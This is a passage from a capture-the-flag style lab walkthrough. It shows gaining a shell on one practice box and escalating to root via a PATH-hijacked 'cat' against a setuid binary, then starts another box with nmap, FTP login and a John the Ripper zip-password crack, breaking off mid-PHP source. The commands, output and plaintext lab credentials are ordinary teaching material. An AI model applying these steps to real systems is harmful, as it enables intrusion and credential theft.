<p>We don&rsquo;t know where the reverse shell was uploaded to. Let&rsquo;s enumerate
the web server for common directories using a the dirsearch tool.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image54.png"
        data-srcset="/startingpoint/media/image54.png, media/image54.png 1.5x, /startingpoint/media/image54.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image54.png"
        title="/startingpoint/media/image54.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>From the output we can see that tool identified the uploads folder</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image55.png"
        data-srcset="/startingpoint/media/image55.png, media/image55.png 1.5x, /startingpoint/media/image55.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image55.png"
        title="/startingpoint/media/image55.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image56.png"
        data-srcset="/startingpoint/media/image56.png, media/image56.png 1.5x, /startingpoint/media/image56.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image56.png"
        title="/startingpoint/media/image56.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image57.png"
        data-srcset="/startingpoint/media/image57.png, media/image57.png 1.5x, /startingpoint/media/image57.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image57.png"
        title="/startingpoint/media/image57.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can set up our listener</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image58.png"
        data-srcset="/startingpoint/media/image58.png, media/image58.png 1.5x, /startingpoint/media/image58.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image58.png"
        title="/startingpoint/media/image58.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Then we can trigger a reverse shell using the curl command.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image59.png"
        data-srcset="/startingpoint/media/image59.png, media/image59.png 1.5x, /startingpoint/media/image59.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image59.png"
        title="/startingpoint/media/image59.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Below a a shell as <strong>www-data</strong> and proceed to upgrade it.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image60.png"
        data-srcset="/startingpoint/media/image60.png, media/image60.png 1.5x, /startingpoint/media/image60.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image60.png"
        title="/startingpoint/media/image60.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let’s upgrade the reverse shell as follow:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">  
  **SHELL=/bin/bash script -q /dev/null**   ![](media/image61.png)
                                            
  **&lt;Ctrl-Z&gt;**                        
                                            
  **stty raw -echo**                        
                                            
  **fg**                                    
                                            
  **reset**                                 
                                            
  **xterm**  

  
</code></pre></td></tr></table>
</div>
</div><h3 id="9702-lateral-movement">◦ Lateral Movement</h3>
<p>==================</p>
<p>The website records are probably retrieved from a database, so it&rsquo;s a
good idea to check for database connection information.</p>
<p>Let’s check for any db file</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image62.png"
        data-srcset="/startingpoint/media/image62.png, media/image62.png 1.5x, /startingpoint/media/image62.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image62.png"
        title="/startingpoint/media/image62.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>And</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image63.png"
        data-srcset="/startingpoint/media/image63.png, media/image63.png 1.5x, /startingpoint/media/image63.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image63.png"
        title="/startingpoint/media/image63.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Let check the **/var/www/html/cdn-cgi/login/db.php. **</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image64.png"
        data-srcset="/startingpoint/media/image64.png, media/image64.png 1.5x, /startingpoint/media/image64.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image64.png"
        title="/startingpoint/media/image64.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>From the php.net manual page
“https://www.php.net/manual/en/function.mysqli-connect.php”, we see how
<strong>mysqli_connect</strong> function works:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">    mysqli\_connect(DB\_HOST, DB\_USERNAME, DB\_PASSWORD,DB\_NAME);&#34;
 
</code></pre></td></tr></table>
</div>
</div><p>Indeed, <strong>db.php</strong> does contain credentials:</p>
<ul>
<li>
<p>DB_USERNAME: <strong>robert</strong></p>
</li>
<li>
<p>DB_PASSWORD:<strong>M3g4C0rpUs3r!</strong></p>
</li>
</ul>
<p><em><strong>We can su robert to move laterally.</strong></em></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image65.png"
        data-srcset="/startingpoint/media/image65.png, media/image65.png 1.5x, /startingpoint/media/image65.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image65.png"
        title="/startingpoint/media/image65.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702--privilege-escalation-1">◦  Privilege Escalation</h3>
<p>======================</p>
<p>The <strong>id</strong> command reveals that <strong>robert</strong> is a member of the
<strong>bugracker</strong> group.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image66.png"
        data-srcset="/startingpoint/media/image66.png, media/image66.png 1.5x, /startingpoint/media/image66.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image66.png"
        title="/startingpoint/media/image66.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can enumerate the filesystem to see if this group has any special
acces</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  -----------------------------------------------------
  **find / -type f -group bugtracker 2&gt;/dev/null**
  -----------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image67.png"
        data-srcset="/startingpoint/media/image67.png, media/image67.png 1.5x, /startingpoint/media/image67.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image67.png"
        title="/startingpoint/media/image67.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ---------------------------------
  **ls -al /usr/bin/bugtracker **
  ---------------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image68.png"
        data-srcset="/startingpoint/media/image68.png, media/image68.png 1.5x, /startingpoint/media/image68.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image68.png"
        title="/startingpoint/media/image68.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We could have use also the following command to concatenate the two
commands:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  --------------------------------------------------------------------
  **find / -type f -group bugtracker 2&gt;/dev/null | xargs ls -al**
  --------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><h4 id="x25b9--setuid">▹  <em><strong>Setuid</strong></em></h4>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image69.png"
        data-srcset="/startingpoint/media/image69.png, media/image69.png 1.5x, /startingpoint/media/image69.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image69.png"
        title="/startingpoint/media/image69.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We can see that there is a special permission on the file “<strong>s</strong>”.</p>
<p>That is the &ldquo;setuid&rdquo; bit, which tells the OS to execute that program
with the userid of its owner.This is typically used with files owned by
root to allow normal users to execute them as root with no external
tools (such as sudo).</p>
<p><strong>SUID</strong> is a special file permission for executable files which enables
other users to run the file with effective permissions of the file
owner. Instead of the normal x which represents execute permissions, you
will see an <strong>s</strong> (to indicate <strong>SUID</strong>) special permission for the
user.</p>
<p><strong>SGID</strong> is a special file permission that also applies to executable
files and enables other users to inherit the effective <strong>GID</strong> of file
group owner. Likewise, rather than the usual x which represents execute
permissions, you will see an <strong>s</strong> (to indicate <strong>SGID</strong>) special
permission for group user.</p>
<p>Let&rsquo;s run the <strong>bugtracker binary</strong> and see what it does.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image70.png"
        data-srcset="/startingpoint/media/image70.png, media/image70.png 1.5x, /startingpoint/media/image70.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image70.png"
        title="/startingpoint/media/image70.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>It seems to output a report based on the ID value provided. Let&rsquo;s use
strings to see how it does this.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image71.png"
        data-srcset="/startingpoint/media/image71.png, media/image71.png 1.5x, /startingpoint/media/image71.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image71.png"
        title="/startingpoint/media/image71.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<!-- <SNIP> -->
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image72.png"
        data-srcset="/startingpoint/media/image72.png, media/image72.png 1.5x, /startingpoint/media/image72.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image72.png"
        title="/startingpoint/media/image72.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>We see that it calls the “<strong>cat”</strong> binary using this relative path
instead of the absolute path.</p>
<p>Let have a look to current $PATH</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------
  **echo <span class="se">\$</span>PATH**
  -----------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image73.png"
        data-srcset="/startingpoint/media/image73.png, media/image73.png 1.5x, /startingpoint/media/image73.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image73.png"
        title="/startingpoint/media/image73.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>By creating a malicious cat, and modifying the path to include the
current working directory, we should be able to abuse this
misconfiguration, and escalate our privileges to root.</p>
<p>Let&rsquo;s add the “<strong>tmp</strong>” directory to PATH</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------
  **export <span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="se">\$</span>PATH**
  -----------------------------
</code></pre></td></tr></table>
</div>
</div><p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image74.png"
        data-srcset="/startingpoint/media/image74.png, media/image74.png 1.5x, /startingpoint/media/image74.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image74.png"
        title="/startingpoint/media/image74.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>Then we move into the tmp folder:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------
  **cd /tmp/**
  --------------
</code></pre></td></tr></table>
</div>
</div><p>Let’ create <em><strong>a malicious cat</strong></em>,</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------
  **echo <span class="s1">&#39;/bin/sh&#39;</span> &gt; cat**
  -----------------------------
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s make it executable.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------
  **chmod +x cat**
  ------------------
</code></pre></td></tr></table>
</div>
</div><p>Now, after making our “malicious” cat executable if we search for the
cat executable with the “which” command we will see:</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image75.png"
        data-srcset="/startingpoint/media/image75.png, media/image75.png 1.5x, /startingpoint/media/image75.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image75.png"
        title="/startingpoint/media/image75.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p>PATH is an <em>environmental variable</em> in <em>Linux</em> and other <em>Unix-like</em>
<em>operating systems</em> that tells the <strong>shell</strong> which <em>directories</em> to
search for <strong>executable files</strong> (i.e., ready-to-run <em>programs</em>) in
response to <em>commands</em> issued by a user.</p>
<p>The first “cat” command to be executed will be “/tmp/cat”, so by running
the bugtracker nìbinary we will have access to a root shell.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image76.png"
        data-srcset="/startingpoint/media/image76.png, media/image76.png 1.5x, /startingpoint/media/image76.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image76.png"
        title="/startingpoint/media/image76.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image77.png"
        data-srcset="/startingpoint/media/image77.png, media/image77.png 1.5x, /startingpoint/media/image77.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image77.png"
        title="/startingpoint/media/image77.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/></p>
<h3 id="9702--post-exploitation">◦  Post Exploitation</h3>
<p>===================</p>
<p>Inside root&rsquo;s folder, we see a .config folder, which contains a
FileZilla config file with the credentials <strong>ftpuser / mc@F1l3ZilL4</strong>
visible in plain text.</p>
<p><img
        width="200"
        height="200"
        class=" lazyload"
        src="/svg/loading.min.svg"
        data-src="media/image78.png"
        data-srcset="/startingpoint/media/image78.png, media/image78.png 1.5x, /startingpoint/media/image78.png 2x"
        data-sizes="auto"
        alt="/startingpoint/media/image78.png"
        title="/startingpoint/media/image78.png"
        style="width: 100%;object-fit: cover;margin: 0pt;"/>{width=&ldquo;5.125in&rdquo; height=&ldquo;1.9791666666666667in&rdquo;}</p>
<h2 id="9656-vaccine">▸ VACCINE</h2>
<h3 id="9702-about-1">◦ About</h3>
<p>This box features working with MD5 hashes and escaping user context to root by exploiting sudoer misconfiguration</p>
<ul>
<li>Machine : <b>Vaccine</b> </li>
<li>Ip: <b>10.10.10.46</b></li>
</ul>
<h3 id="9702-enumeration">◦ Enumeration</h3>
<p>======================</p>
<p><em><strong>nmap -sC -sV 10.10.10.46</strong></em></p>
<p>Running a simple Nmap scan reveals three open ports running, for FTP,
SSH and Apache respectively.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">  ------------------------------------------------------------------------------------------------
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-03 10:28 EDT
  
  Nmap scan report for 10.10.10.46
  
  Host is up (0.041s latency).
  
  Not shown: 997 closed ports
  
  PORT STATE SERVICE VERSION
  
  **21/tcp** open ftp vsftpd 3.0.3
  
  **22/tcp** open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0)
  
  | ssh-hostkey:
  
  | 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
  
  | 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
  
  |\_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
  
  **80/tcp** open http Apache httpd 2.4.41 ((Ubuntu))
  
  | http-cookie-flags:
  
  | /:
  
  | PHPSESSID:
  
  |\_ httponly flag not set
  
  |\_http-server-header: Apache/2.4.41 (Ubuntu)
  
  |\_http-title: MegaCorp Login
  
  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux\_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  
  Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds
  ------------------------------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>The credentials <strong>ftpuser / mc@F1l3ZilL4</strong> can be used to login to the
FTP server.</p>
<p><em><strong>ftp 10.10.10.46</strong></em></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">----------------------------------
Connected to 10.10.10.46.

<span class="m">220</span> <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>

Name <span class="o">(</span>10.10.10.46:kali<span class="o">)</span>: ftpuser

<span class="m">331</span> Please specify the password.

Password:

<span class="m">230</span> Login successful.
----------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Let’s see what is in there:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ---------------------------------------------------
  Remote system <span class="nb">type</span> is UNIX.
  
  Using binary mode to transfer files.
  
  ftp&gt; dir
  
  <span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
  
  <span class="m">150</span> Here comes the directory listing.
  
  -rw-r--r-- <span class="m">1</span> <span class="m">0</span> <span class="m">0</span> <span class="m">2533</span> Feb <span class="m">03</span> 11:27 backup.zip
  
  <span class="m">226</span> Directory send OK.
  ---------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>A file named <strong>backup.zip</strong> is found in the folder. Let get the *.zip
file:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ----------------------------------------------------------------------
  ftp&gt; ***get backup.zip***
  
  local: backup.zip remote: backup.zip
  
  <span class="m">200</span> PORT <span class="nb">command</span> successful. Consider using PASV.
  
  <span class="m">150</span> Opening BINARY mode data connection <span class="k">for</span> backup.zip <span class="o">(</span><span class="m">2533</span> bytes<span class="o">)</span>.
  
  <span class="m">226</span> Transfer complete.
  
  <span class="m">2533</span> bytes received in 0.00 secs <span class="o">(</span>1.1824 MB/s<span class="o">)</span>
  
  ftp&gt;
  
  <span class="m">741852963</span> <span class="o">(</span>backup.zip<span class="o">)</span>
  ----------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Extraction of the archive fails as it&rsquo;s password protected. The password
can be cracked using <strong>zip2john</strong>, <strong>JohntheRipper</strong> and
<strong>rockyou.txt</strong>.</p>
<p>The zip2john tool will be used to process the input ZIP files into an
<strong>hash</strong> format suitable for use with JohntheRipper</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------
  **zip2john backup.zip &gt; hash**
  -----------------------------------
</code></pre></td></tr></table>
</div>
</div><p>The rockyou.txt file (with the passwords) is located here :</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  -----------------------------------------
  **locate rockyou.txt**
  
  **/usr/share/wordlists/rockyou.txt.gz**
  -----------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>To extract the <strong>rockyou.txt.gz</strong> file we use the <strong>gunzip</strong> command:</p>
<ul>
<li>
<p><strong>gunzip /usr/share/wordlists/rockyou.txt.gz</strong></p>
<p>Now it is possible to use the <strong>JohntheRipper</strong> tool as sown below:</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------------------------
  **john <span class="nb">hash</span> --fork<span class="o">=</span><span class="m">4</span> -w<span class="o">=</span>/usr/share/wordlists/rockyou.txt**
  
  Using default input encoding: UTF-8
  
  Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="se">\[</span>32/64<span class="se">\]</span><span class="o">)</span>
  
  Node numbers 1-4 of <span class="m">4</span> <span class="o">(</span>fork<span class="o">)</span>
  
  Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
  
  ***741852963** <span class="o">(</span>backup.zip<span class="o">)</span>*
  
  <span class="m">1</span> 1g 0:00:00:00 DONE <span class="o">(</span>2020-07-03 11:33<span class="o">)</span> 100.0g/s 25600p/s 25600c/s
  
  .......
  
  Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
  
  Session completed
  --------------------------------------------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>As we can see, the password for the backup.zip file is found to be
<strong>741852963</strong></p>
<p>Extracting it&rsquo;s contents using the password reveals a PHP file and a CSS
file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  ------------------------------------
  **unzip backup.zip **
  
  Archive: backup.zip
  
  <span class="se">\[</span>backup.zip<span class="se">\]</span> index.php password:
  
  inflating: index.php
  
  inflating: style.css
  ------------------------------------
</code></pre></td></tr></table>
</div>
</div><p>Inspecting the PHP source code, we find a login check.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">  --------------------------------------------------------------------------------------------------------------------------------
  &lt;?php
  
  session<span class="se">\_</span>start<span class="o">()</span><span class="p">;</span>
  
  <span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="se">\$\_</span>POST<span class="se">\[</span><span class="s1">&#39;username&#39;</span><span class="se">\]</span><span class="o">)</span> <span class="o">&amp;&amp;</span> isset<span class="o">(</span><span class="se">\$\_</span>POST<span class="se">\[</span><span class="s1">&#39;password&#39;</span><span class="se">\]</span><span class="o">))</span> <span class="o">{</span>
  
  <span class="k">if</span><span class="o">(</span><span class="se">\$\_</span>POST<span class="se">\[</span><span class="s1">&#39;**username**&#39;</span><span class="se">\]</span> <span class="o">===</span> <span class="s1">&#39;**admin**&#39;</span> <span class="o">&amp;&amp;</span> md5<span class="o">(</span><span class="se">\$\_</span>POST<span class="se">\[</span><span class="s1">&#39;**password**&#39;</span><span class="se">\]</span><span class="o">)</span> <span class="o">===</span> <span class="s2">&#34;**2cb42f8734ea607eefed3b70af13bbd3**&#34;</span><span class="o">)</span> <span class="o">{</span>
  
  <span class="se">\$\_</span>SESSION<span class="se">\[</span><span class="s1">&#39;login&#39;</span><span class="se">\]</span> <span class="o">=</span> <span class="s2">&#34;true&#34;</span><span class="p">;</span>
